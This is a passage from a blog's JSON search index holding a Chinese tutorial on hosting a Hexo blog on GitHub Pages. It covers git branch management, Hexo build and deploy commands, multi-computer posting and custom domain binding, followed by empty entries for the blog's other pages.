class=\"line\">然后连接测试</span><br><span class=\"line\">ssh –T git@github.com</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>Step3 创建分支管理<br>新创建的仓库的默认分支(branches)是master 我们需要再创建一个存放hexo源文件的分支<br>新建一个空的文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#git init</span><br><span class=\"line\">#git  remote add origin https://github.com/Huseck/huseck.github.io.git</span><br><span class=\"line\">#git pull origin master</span><br><span class=\"line\">#git branch hexo  //创建分支</span><br><span class=\"line\">#git checkout hexo</span><br><span class=\"line\">#git push origin hexo</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<p>查看一个github上仓库会发现有两个分支了<br>需要向hexo分支上传hexo的源文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#git remote add origin https://github.com/github名.github.io.git</span><br><span class=\"line\">#git pull origin hexo</span><br><span class=\"line\">#git checkout hexo</span><br><span class=\"line\">#git add .  //当前有hexo源文件的目录下</span><br><span class=\"line\">#git commit -m &quot;hexo blog&quot;</span><br><span class=\"line\">#git push origin hexo</span><br></pre></td></tr></table></figure></p>\n<p>上传成功<br>然后我们上传静态文件到master分支<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#hexo g</span><br><span class=\"line\">#hexo s //会生成public 目录里面就是我们上传到master分支上的文件</span><br><span class=\"line\">        //有两种方式上传1.是#hexo d 需要配置</span><br><span class=\"line\">        在hexo 源文件的根目录_config.yml最后添加</span><br><span class=\"line\">deploy:</span><br><span class=\"line\">  type: git</span><br><span class=\"line\">  repo: https://github.com/Huseck/huseck.github.io.git</span><br><span class=\"line\">  name: Huseck</span><br><span class=\"line\">  email: 504038236@qq.com</span><br><span class=\"line\">  branch: master</span><br><span class=\"line\">         //第二种方式直接进入public文件下，需要执行git的拉取选择仓库等命令比较繁琐</span><br><span class=\"line\">#git init</span><br><span class=\"line\">#git remote add origin https://github.com/github名.github.io.git</span><br><span class=\"line\">#git pull origin master</span><br><span class=\"line\">#git add .</span><br><span class=\"line\">#git commit -m &quot;public file&quot;</span><br><span class=\"line\">#git push origin master</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"多电脑进行博文编写\"><a href=\"#多电脑进行博文编写\" class=\"headerlink\" title=\"多电脑进行博文编写\"></a>多电脑进行博文编写</h2><p>如果我们的博客不是一个人在发布博文，或者换电脑了<br>想实现这样的思路就是<br>创建两个分支 一个装hexo生成的静态网页 一个装hexo源文件<br>在其他电脑上发布博客的话思路就是克隆装hexo源文件的仓库，本地编写好.md文件，然后hexo g 编译成最新的静态网页，之后hexo d 发布到装有静态网页的仓库中，就实现了最新的博文发布了，最后，最后就是把hexo源文件编写的.md博文上传到hexo源文件的仓库中，避免其他人使用的时候把之前生成的静态博文冲突掉。<br><strong>注：一定需要保持hexo源文件的.md文件和生成的静态文件内容保持一致</strong><br><strong>具体过程</strong> </p>\n<ol>\n<li>确认电脑上有git 和nodejs环境<br>首先是已经在github上添加ssh-keys了<br>然后本目录下新建一个空的目录<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#git init</span><br><span class=\"line\">#git  remote add origin https://github.com/Huseck/huseck.github.io.git</span><br><span class=\"line\">#git pull origin hexo</span><br><span class=\"line\">#git checkout hexo</span><br><span class=\"line\">#cnpm install 或者 npm install </span><br><span class=\"line\">#cnpm install hexo --save</span><br><span class=\"line\">#hexo new &quot;博文名称&quot;</span><br><span class=\"line\">#hexo g</span><br><span class=\"line\">#hexo s  //测试是否内容更新</span><br><span class=\"line\">#hexo clean //清理一下缓存</span><br><span class=\"line\">#hexo g</span><br><span class=\"line\">#hexo s</span><br><span class=\"line\">#hexo d //上传到master中</span><br><span class=\"line\">另一种方法就是 </span><br><span class=\"line\">先添加远程仓库，然后克隆分支，更新内容。</span><br><span class=\"line\">git clone -b hexo git@github.com:Huseck/huseck.github.io.git</span><br><span class=\"line\">安装 npm install </span><br><span class=\"line\">npm install hexo --save</span><br><span class=\"line\">然后运行 hexo s  调试</span><br><span class=\"line\">最后push 到分支</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p><strong>注如果出现错误</strong><br>需要<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global push.default matching</span><br></pre></td></tr></table></figure></p>\n<p>消除此警告并采用新的设置值，输入：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global push.default simple</span><br></pre></td></tr></table></figure></p>\n<p>然后重新init remote 等操作需要从头开始了</p>\n<ol start=\"2\">\n<li><p>更新hexo源文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#hexo clean</span><br><span class=\"line\">#git add .</span><br><span class=\"line\">#git commit -m &quot;upodate&quot;</span><br><span class=\"line\">#git push origin hexo</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>更新一下域名<br><img src=\"QQ图片20170908111953.png\" alt=\"\"><br><strong>总结</strong><br>其他人编写博文需要在github 添加ssh-keys然后拉取hexo源文件的分支<br>今天编写.md文件上传到hexo源文件的分支仓库中，保持博文的最新<br>之后就是#hexo d 上传静态html</p>\n<h2 id=\"绑定域名\"><a href=\"#绑定域名\" class=\"headerlink\" title=\"绑定域名\"></a>绑定域名</h2><p>这里使用的是阿里云的域名直接配置解析<br>首先获取IP地址<br>ping github名.github.io<br>然后填写到解析地址上<br>之后需要配置github<br><img src=\"QQ图片20170908111953.png\" alt=\"\"><br>填写自定义的域名</p>\n</li>\n</ol>\n","categories":["blog"],"tags":["blog","运维"]},{"title":"about","url":"https://www.xjseck.com/about/index.html","content":"","categories":[],"tags":[]},{"title":"category","url":"https://www.xjseck.com/category/index.html","content":"","categories":[],"tags":[]},{"title":"link","url":"https://www.xjseck.com/link/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"https://www.xjseck.com/search/index.html","content":"","categories":[],"tags":[]},{"title":"tag","url":"https://www.xjseck.com/tag/index.html","content":"","categories":[],"tags":[]}]